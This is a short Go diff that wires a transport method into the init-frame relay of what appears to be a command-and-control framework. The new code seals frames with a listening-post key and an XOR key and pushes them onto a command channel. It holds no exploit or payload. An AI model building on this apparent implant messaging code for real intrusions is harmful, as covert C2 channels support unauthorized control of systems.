@@ -6,6 +6,7 @@ import (
 	routine "shlyuz/pkg/crypto"
 	"shlyuz/pkg/crypto/asymmetric"
 	"shlyuz/pkg/instructions"
+	"shlyuz/pkg/transport"
 )
 
 type initFrameArgs struct {
@@ -27,12 +28,17 @@ func GenerateInitFrame(component component.Component) instructions.InstructionFr
 	return *instructionFrame
 }
 
-func RelayInitFrame(component component.Component, initFrame instructions.InstructionFrame) component.Component {
+func RelayInitFrame(shlyuzComponent component.Component, initFrame instructions.InstructionFrame, shlyuzTransport transport.TransportMethod) component.Component {
 	frameMap, _ := json.Marshal(initFrame)
-	transmitFrame, frameKeyPair := routine.PrepareTransmitFrame(frameMap, component.CurrentLpPubkey, component.XorKey)
-	component.CurrentKeypair = frameKeyPair
+	transmitFrame, frameKeyPair := routine.PrepareSealedFrame(frameMap, shlyuzComponent.CurrentLpPubkey, shlyuzComponent.XorKey, shlyuzComponent.Config.InitSignature)
+	shlyuzComponent.CurrentKeypair = frameKeyPair
+	go func(shlyuzComponent *component.Component, frame []byte) {
+		shlyuzComponent.CmdChannel <- transmitFrame
+	}(&shlyuzComponent, transmitFrame)
+	// shlyuzComponent.CmdChannel <- transmitFrame
 	// TODO: Do the relaying and retreive the ackFrame
-	return component
+	shlyuzTransport.Send(&shlyuzComponent)
+	return shlyuzComponent
 }
 
 func rekey(frame routine.EncryptedFrame) {
